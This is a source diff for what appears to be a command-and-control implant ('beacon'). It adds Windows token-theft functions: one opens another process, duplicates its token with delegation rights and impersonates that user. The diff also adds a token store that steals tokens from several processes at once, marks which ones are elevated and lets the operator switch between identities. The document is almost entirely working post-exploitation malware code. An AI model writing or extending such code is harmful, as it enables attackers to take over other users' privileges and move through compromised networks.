@@ -9,6 +9,7 @@
 #include "commands.h"
 #include "beacon.h"
 #include "parse.h"
+#include "bformat.h"
 #include <WinSock2.h>
 
 /* populate a buffer with DOMAIN\user from a token.
@@ -126,8 +127,76 @@ void command_getuid(char * buffer, int length, void(*callback)(char * buffer, in
 	}
 }
 
+static BOOL steal_token_from_pid(int pid, DWORD access, HANDLE * out_token, char * name, int nlen) {
+	HANDLE token = NULL;
+	HANDLE handle = NULL;
+	HANDLE dup = NULL;
+
+	if (access == 0)
+		access = TOKEN_ALL_ACCESS;
+
+	handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+	if (!handle) {
+		post_error_dd(0x21, pid, GetLastError());
+		return FALSE;
+	}
+	if (!OpenProcessToken(handle, access, &token)) {
+		post_error_dd(0x24, pid, GetLastError());
+		CloseHandle(handle);
+		return FALSE;
+	}
+	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &dup)) {
+		post_error_dd(0x26, pid, GetLastError());
+		CloseHandle(token);
+		CloseHandle(handle);
+		return FALSE;
+	}
+	CloseHandle(token);
+	CloseHandle(handle);
+	if (name != NULL)
+		token_user(dup, name, nlen);
+	*out_token = dup;
+	return TRUE;
+}
+
 /* steal a token y0 */
 void command_steal_token(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
+	int pid;
+	DWORD access = TOKEN_ALL_ACCESS;
+	HANDLE stolen = NULL;
+	char name[512];
+	datap parser;
+
+	if (length != 4 && length != 8)
+		return;
+
+	data_init(&parser, buffer, length);
+	pid = (int)data_int(&parser);
+	if (length == 8)
+		access = data_int(&parser);
+
+	if (!steal_token_from_pid(pid, access, &stolen, name, 512))
+		return;
+
+	command_rev2self();
+
+	if (!ImpersonateLoggedOnUser(stolen)) {
+		post_error_dd(0x25, pid, GetLastError());
+		CloseHandle(stolen);
+		return;
+	}
+	atoken = stolen;
+	if (!ImpersonateLoggedOnUser(atoken)) {
+		post_error_dd(0x27, pid, GetLastError());
+		return;
+	}
+	if (name[0] != '\0')
+		callback(name, (int)strlen(name), CALLBACK_TOKEN_STOLEN);
+}
+
+/* leftover original body removed */
+#if 0
+void command_steal_token_old(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
 	int pid;
 	HANDLE token = NULL;
 	HANDLE handle = NULL;
@@ -186,6 +255,166 @@ void command_steal_token(char * buffer, int length, void (*callback)(char * buff
 
 	if (token_user(atoken, name, 512)) {
 		callback(name, strlen(name), CALLBACK_TOKEN_STOLEN);
+	}
+}
+#endif
+
+#define TOKEN_STORE_MAX 32
+
+typedef struct {
+	int used;
+	int id;
+	HANDLE token;
+	char name[512];
+	int admin;
+} token_slot;
+
+static token_slot token_store[TOKEN_STORE_MAX];
+static int token_store_next_id = 1;
+
+static int token_store_put(HANDLE tok, const char * name) {
+	int i;
+	for (i = 0; i < TOKEN_STORE_MAX; i++) {
+		if (!token_store[i].used) {
+			token_store[i].used = 1;
+			token_store[i].id = token_store_next_id++;
+			token_store[i].token = tok;
+			memset(token_store[i].name, 0, sizeof(token_store[i].name));
+			if (name != NULL)
+				strncpy(token_store[i].name, name, sizeof(token_store[i].name) - 1);
+			{
+				TOKEN_ELEVATION elev;
+				DWORD ret = 0;
+				elev.TokenIsElevated = 0;
+				GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &ret);
+				token_store[i].admin = elev.TokenIsElevated ? 1 : 0;
+			}
+			return token_store[i].id;
+		}
+	}
+	return -1;
+}
+
+static token_slot * token_store_find(int id) {
+	int i;
+	for (i = 0; i < TOKEN_STORE_MAX; i++) {
+		if (token_store[i].used && token_store[i].id == id)
+			return &token_store[i];
+	}
+	return NULL;
+}
+
+static void token_store_drop_slot(token_slot * s) {
+	if (s == NULL || !s->used)
+		return;
+	if (s->token != NULL && s->token != atoken)
+		CloseHandle(s->token);
+	memset(s, 0, sizeof(*s));
+}
+
+static void token_store_format_line(token_slot * s, char * out, int max) {
+	if (s->admin)
+		_snprintf(out, max, "%d\t%s (admin)\n", s->id, s->name);
+	else
+		_snprintf(out, max, "%d\t%s\n", s->id, s->name);
+	out[max - 1] = '\0';
+}
+
+void command_token_store(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
+	datap parser;
+	int sub;
+	char line[640];
+	data_init(&parser, buffer, length);
+	sub = (int)data_int(&parser);
+	if (sub == 1) { /* steal */
+		DWORD access = data_int(&parser);
+		int count = (int)data_int(&parser);
+		int i;
+		formatp fmt;
+		bformat_init(&fmt, 4096);
+		for (i = 0; i < count; i++) {
+			int pid = (int)data_int(&parser);
+			HANDLE stolen = NULL;
+			char name[512];
+			int id;
+			memset(name, 0, sizeof(name));
+			if (!steal_token_from_pid(pid, access, &stolen, name, 512))
+				continue;
+			id = token_store_put(stolen, name);
+			if (id < 0) {
+				CloseHandle(stolen);
+				continue;
+			}
+			token_store_format_line(token_store_find(id), line, (int)sizeof(line));
+			bformat_copy(&fmt, line, (int)strlen(line));
+		}
+		if (bformat_length(&fmt) > 0)
+			callback(bformat_string(&fmt), (int)bformat_length(&fmt), CALLBACK_TOKEN_STORE_STEAL);
+		bformat_free(&fmt);
+	}
+	else if (sub == 2) { /* use */
+		int id = (int)data_int(&parser);
+		token_slot * s = token_store_find(id);
+		if (s == NULL) {
+			post_error_d(0x0d, id);
+			return;
+		}
+		command_rev2self();
+		if (!ImpersonateLoggedOnUser(s->token)) {
+			post_error_d(0x25, GetLastError());
+			return;
+		}
+		DuplicateTokenEx(s->token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &atoken);
+		ImpersonateLoggedOnUser(atoken);
+		callback(s->name, (int)strlen(s->name), CALLBACK_TOKEN_STOLEN);
+	}
+	else if (sub == 3) { /* remove some */
+		int count = (int)data_int(&parser);
+		int i;
+		for (i = 0; i < count; i++) {
+			int id = (int)data_int(&parser);
+			token_store_drop_slot(token_store_find(id));
+		}
+	}
+	else if (sub == 4) { /* show */
+		int i;
+		formatp fmt;
+		bformat_init(&fmt, 4096);
+		for (i = 0; i < TOKEN_STORE_MAX; i++) {
+			if (!token_store[i].used)
+				continue;
+			token_store_format_line(&token_store[i], line, (int)sizeof(line));
+			bformat_copy(&fmt, line, (int)strlen(line));
+		}
+		callback(bformat_string(&fmt), (int)bformat_length(&fmt), CALLBACK_TOKEN_STORE);
+		bformat_free(&fmt);
+	}
+	else if (sub == 5) { /* remove all */
+		int i;
+		for (i = 0; i < TOKEN_STORE_MAX; i++)
+			token_store_drop_slot(&token_store[i]);
+	}
+	else if (sub == 6) { /* steal and use */
+		DWORD access = data_int(&parser);
+		int pid = (int)data_int(&parser);
+		HANDLE stolen = NULL;
+		char name[512];
+		int id;
+		memset(name, 0, sizeof(name));
+		if (!steal_token_from_pid(pid, access, &stolen, name, 512))
+			return;
+		id = token_store_put(stolen, name);
+		if (id < 0) {
+			CloseHandle(stolen);
+			return;
+		}
+		command_rev2self();
+		if (!DuplicateTokenEx(stolen, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &atoken)) {
+			post_error_d(0x26, GetLastError());
+			return;
+		}
+		ImpersonateLoggedOnUser(atoken);
+		callback(name, (int)strlen(name), CALLBACK_TOKEN_STOLEN);
 	}
 }
 
